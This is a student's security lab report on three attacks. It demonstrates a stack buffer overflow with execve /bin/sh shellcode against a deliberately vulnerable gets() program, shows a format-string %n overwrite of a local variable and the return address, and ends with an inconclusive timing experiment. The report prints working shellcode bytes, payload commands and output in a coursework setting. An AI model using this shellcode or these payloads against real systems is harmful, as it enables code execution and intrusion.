Part I:
To complete Part I, I followed the same steps shown in the tutorial provided with the
assignment, altering a few parts to work with my code and machine.
I started off creating the assembly code that my test.c code would eventually run
as a result of the stack buffer overflow attack. This assembly code is written inline
in shell.c: 

int main(){
    asm("\
needle0: jmp there\n\
here:    pop %rdi\n\
         xor %rax, %rax\n\
         movb $0x3b, %al\n\
         xor %rsi, %rsi\n\
         xor %rdx, %rdx\n\
         syscall\n\
there:   call here\n\
.string \"/bin/sh\"\n\
needle1: .octa 0xdeadbeef\n\
    ");
}

Compiling and running shell.c confirms that this assembly code does start a shell.

Next, I found the addresses that contained this machine code using objdump.

adam@adam-VirtualBox:~/Desktop/security_lab$ objdump -d a.out | sed -n '/needle0/,/needle1/p'
0000000000001131 <needle0>:
    1131:	eb 0e                	jmp    1141 <there>

0000000000001133 <here>:
    1133:	5f                   	pop    %rdi
    1134:	48 31 c0             	xor    %rax,%rax
    1137:	b0 3b                	mov    $0x3b,%al
    1139:	48 31 f6             	xor    %rsi,%rsi
    113c:	48 31 d2             	xor    %rdx,%rdx
    113f:	0f 05                	syscall 

0000000000001141 <there>:
    1141:	e8 ed ff ff ff       	callq  1133 <here>
    1146:	2f                   	(bad)  
    1147:	62                   	(bad)  
    1148:	69                   	.byte 0x69
    1149:	6e                   	outsb  %ds:(%rsi),(%dx)
    114a:	2f                   	(bad)  
    114b:	73 68                	jae    11b5 <__libc_csu_init+0x45>
	...

000000000000114e <needle1>:

adam@adam-VirtualBox:~/Desktop/security_lab$ xxd -s0x1131 -l32 -p a.out shellcode

(The machine code is 29 bytes long, so I put the 32 bytes after address 0x1131 into 
shellcode since that is the least multiple of 8 that is equal to or greater than 29)
This is what shellcode looks like:
eb0e5f4831c0b03b4831f64831d20f05e8edffffff2f62696e2f736800ef
bead

The vulnerable code I wrote for the stack buffer overflow attack, test.c:
#include <stdio.h>

int main(){
    char buffer[32];
    printf("%p\n", buffer);
    gets(buffer);
    printf("string read: %s\n", buffer);

    return 0;
}
gets() does not stop reading after the 32 allocated bytes have been read, so the remaining 
bytes fed from stdin will overwrite whatever is above the runtime stack. The goal is to 
overwrite the return address of main to the start of the buffer, which would contain the
machine code to start the shell.

First, test.c has to be compiled such that this attack is possible.
adam@adam-VirtualBox:~/Desktop/security_lab$ gcc -fno-stack-protector -z execstack -o test test.c
-fno-stack-protector disables stack canaries and -z execstack allows the stack to be executable.
Whenever running test, it is run as $setarch x86_64 -R ./test to disable ASLR.

test.c prints out the address of the start of the buffer. This will be the address that the 
return address for main will be overwritten to in the attack.
adam@adam-VirtualBox:~/Desktop/security_lab$ setarch x86_64 -R ./test
0x7fffffffdff0
Because ASLR is disabled, the buffer will always start at address 0x7fffffffdff0.

This address needs to be little endian when written in the buffer, so a printf statement
is written to do so and saved as variable 'a'.
adam@adam-VirtualBox:~/Desktop/security_lab$a='printf %016x 0x7fffffffdff0 | tac -rs..'

Finally, the attack is ready!
$ ( ( cat shellcode ; printf %016d 0 ; echo $a ) | xxd -r -p ;
cat ) | setarch x86_64 -R ./test

In test.c, 32 bytes are allocated to buffer, which is the same size as shellcode.
Therefore, another 8 bytes have to be added to overwrite what's in the RBP register.
This is the purpose of 'printf %016d 0', which writes 16 0's to occupy 8 bytes.
Then, echo $a prints the little endian format of the address for the start of the buffer.
This address overwrites the return address for main and returns to the start of the buffer.
This allows shellcode to be executed.
Here is the output after launching the attack, arbitrarily typing "hello", 
and checking if a shell is started by using ls:
0x7fffffffdff0
hello
string read: �_H1��;H1�H1������/bin/sh
ls
a.out  formatTest  formatTest.c  shell.c  shellcode  test  test.c

The attack was successful! Of course, I had to disable 3 countermeasures to make
this attack work.



Part II:
The first goal of part II is to find an input format string that overwrites a local variable.
I include a local variable named target in formatTest.c:
#include <stdio.h>

int main(){
    const int n = 128;
    char buffer[n];
    int target = 4660; //0x1234
    fgets(buffer, n, stdin);
    printf(buffer);
    if(target != 4660){
        printf("target overwritten\n");
    }

    return 0;
}
I initially give target a value of 4600, which is 0x1234 in hex, to make it easy to
identify in disassembly.

To find the address of target, I run gdb formatTest (after compiling) and use 
(gdb) disas main.
There, I can see the line "movl   $0x1234,-0x2c(%rbp)". Now I know that the address of target
is stored at the address 0x2c below the base pointer.
I set a breakpoint right before fgets is called with (gdb) br *main+221 and run formatTest.
I then check the address 0x2c below the base pointer to confirm that this is indeed
where target is stored.

(gdb) x $rbp-0x2c
0x7fffffffdfa4:	0x00001234

I have now confirmed that target is stored at address 0x7fffffffdfa4.

Now, I want to find how far into the stack I have to go until characters from the buffer are
read if I use a formatted string. This is how I will be able to overwrite target.
I accomplish this by leading the formatted string with a series of A's, since I know that
will create a 414141... pattern on the stack. When I see this pattern appear, I can determine
that this is where the buffer's memory in the stack begins.

adam@adam-VirtualBox:~/Desktop/security_lab$ setarch x86_64 -R ./formatTest 
AAAAAA%08x %08x %08x %08x %08x %08x %08x %08x
AAAAAA555592a1 00000000 555592cf ffffdf80 0000007c 41414141 25207838 78383025

I can see here that after 5 instances of %08x, the next %08x prints the start of the buffer.
Therefore, if my formatted string contains 5 instances of %08x followed by %n, whatever
I have written at the beginning of my string is the address that will get written to.
If I write the address of target at the beginning of my string, it will get overwritten by %n.

Making sure to write the address as little endian, I craft my formatted string as :
target address | 5 * %08x | %n

dam@adam-VirtualBox:~/Desktop/security_lab$ setarch x86_64 -R ./formatTest 
\xa4\xdf\xff\xff\xff\x7f\x00\x00%08x %08x %08x %08x %08x %n
\xa4\xdf\xff\xff\xff\x7f\x00\x00555592a1 00000000 555592d9 ffffdf80 0000007ctarget overwritten

"target overwritten" is printed, confirming that the value of target has been changed
Success!!

This same method of attack can also be used to overwrite the return address.
Going back to gdb, use the same breakpoint (gdb) br *main+221, and use "info frame",
I can see:
Saved registers:
  rbx at 0x7fffffffdfc8, rbp at 0x7fffffffdfd0, rip at 0x7fffffffdfd8
rip at 0x7fffffffdfd8 lets me know that the return address is stored at memory address
0x7fffffffdfd8.
I can change my formatted string to \xd8\xdf\xff\xff\xff\x7f\x00\x00%08x %08x %08x %08x %08x %n
and overwrite the return address.

This attack still works when -fstack-protector is enabled since I am only overwriting memory
that I specify. I do not have to touch any stack canaries to get to the memory that I want.

Unfortunately, I was unable to figure out how to manipulate the value that gets written by %n
and overwrite the return address to the address that I want it to, so I was unable to complete that
part of this lab.


Part III:
For this part, my interpretation of the goal was to use the random byte as the index of an array
that I had to access. My hypothesis was that for higher indices of the array, it would take slightly
longer to access. I was hoping that some differences in access time would appear in either of my
timeTest programs, but there does not seem to be a correlation.

In both programs, I created an integer array 'a' and generated a random number 'n'. I used two different
timing methods to measure the time it would take to set a[n] to 10.

Without adding sleep(1), there is
almost no difference in time at all, no matter how large the array is or how far apart two different
indices are. After adding sleep(1), there is more variance in the times, but they do not seem
to correspond at all to the value of the random number.